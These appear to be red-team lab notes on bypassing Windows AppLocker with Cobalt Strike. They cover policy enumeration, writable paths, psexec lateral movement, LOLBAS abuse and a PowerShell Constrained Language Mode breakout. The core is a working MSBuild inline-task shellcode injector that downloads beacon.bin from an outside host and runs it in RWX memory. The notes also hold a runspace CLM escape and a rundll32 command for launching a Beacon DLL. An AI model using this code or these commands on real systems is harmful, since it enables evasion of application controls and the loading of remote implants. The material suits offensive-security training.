# AppLocker

AppLocker restricts apps and scripts that are allowed to run on a machine, defined through a set of policies pushed via GPO. Rules can allow or deny based on file attributes such as publisher, name, version, hash or path, and can be assigned on an individual user or group basis. AppLocker also changes the PS [Language Mode](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes) from FullLanguage to ConstrainedLanguage, which restricts the .NET types that can be used.

AppLocker is only as good as the defined ruleset, and comes with default rules which are very broad and allow all executables and scripts located in the Program Files and Windows directories.

## Policy Enumeration

AppLocker is applied to dc.dev-studio.com.

The policy can be read from two places:

* Directly from the GPO (find the GPO, download the Registry.pol file from the gpcfilesyspath and parse with Parse-PolFile)
* From the local registry of a machine they're applied to

      beacon> powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath
      
      AppLocker   \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}
      
      beacon> download \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol

Example ValueData:

    ValueData: <FilePathRule Id="a61c8b2c-a319-4cd0-9690-d2177cad7b51" Name="(Default Rule) All files located in the Windows folder" Description="Allows members of the Everyone group to run applications that are located in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\*"/></Conditions></FilePathRule>

Query the registry at ```HKLM:Software\Policies\Microsoft\Windows\SrpV2``` to obtain the same.

    PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
    PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"

DLL rules are not enforced -- Microsoft claims it can impact system performance.

## Writeable Paths

The default rules allow execution from C:\Program Files and C:\Windows. Moving laterally to a protected machine via psexec is trivial, because the service executable is written into C:\Windows:

    beacon> jump psexec64 dc.dev-studio.com smb

If on a protected machine as a standard user, several directories within C:\Windows are writeable, e.g. C:\Windows\Tasks -- allows us to copy an executable in and run it:

    beacon> powershell Get-Acl C:\Windows\Tasks | fl

When enumerating rules, may also find more weak rules by system admins, e.g.:

<FilePathCondition Path="*\AppV\*"/>

## Living Off The Land Binaries, Scripts and Libraries

LOLBAS are binaries and scripts that are part of Windows but allow for arbitrary code execution. They allow bypassing AppLocker, because they're in trusted paths and may also be signed by Microsoft.

The [LOLBAS website](https://lolbas-project.github.io) contains hundreds of usable examples. If not blocked,MSBuild can be used to execute arbitrary C# code from a .csproj or .xml file:

    <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
      <Target Name="MSBuild">
       <MSBuildTest/>
      </Target>
       <UsingTask
        TaskName="MSBuildTest"
        TaskFactory="CodeTaskFactory"
        AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
         <Task>
          <Code Type="Class" Language="cs">
            <![CDATA[
                using System;
                using Microsoft.Build.Framework;
                using Microsoft.Build.Utilities;
    
                public class MSBuildTest : Task, ITask
                {
                    public override bool Execute()
                    {
                        Console.WriteLine("Hello World");
                        return true;
                    }
                }
            ]]>
          </Code>
        </Task>
      </UsingTask>
    </Project>

Turn this into a basic shellcode injector:

<details>
  <summary> Injector </summary>

```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "http://nickelviper.com";
                        shellcode = client.DownloadData("beacon.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

</details>

Use http_x64.xprocess.bin here and host it on the Cobalt Strike Team Server via Site Management > Host File.

## PowerShell CLM

If running a script or command in PS results in an error like "only core types in this language mode", then you're in a restricted environment. If you can find an AppLocker bypass to execute arbitrary code, you can also break out of PS Constrained Language Mode by using an unmanaged PowerShell runspace. If you have a Beacon running on a target, use powerpick:

    beacon> powershell $ExecutionContext.SessionState.LanguageMode
    ConstrainedLanguage
    beacon> powerpick $ExecutionContext.SessionState.LanguageMode
    FullLanguage

Can also be done in C# (using MSBuild as the example again):

<details>
  <summary> FullLanguage example code </summary>

```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
     <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Linq;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;

            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    using (var runspace = RunspaceFactory.CreateRunspace())
                    {
                      runspace.Open();

                      using (var posh = PowerShell.Create())
                      {
                        posh.Runspace = runspace;
                        posh.AddScript("$ExecutionContext.SessionState.LanguageMode");
                                                
                        var results = posh.Invoke();
                        var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
                        
                        Console.WriteLine(output);
                      }
                    }

                return true;
              }
            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```


</details>

## Beacon DLL

DLL enforcement is not usually enabled so can call exported functions from DLLs on disk via rundll32. Beacon's DLL payload exposes several exports including DllMain and StartW. These can be changed in the Artifact Kit under src-main, dllmain.def.

    C:\Windows\System32\rundll32.exe http_x64.dll,StartW

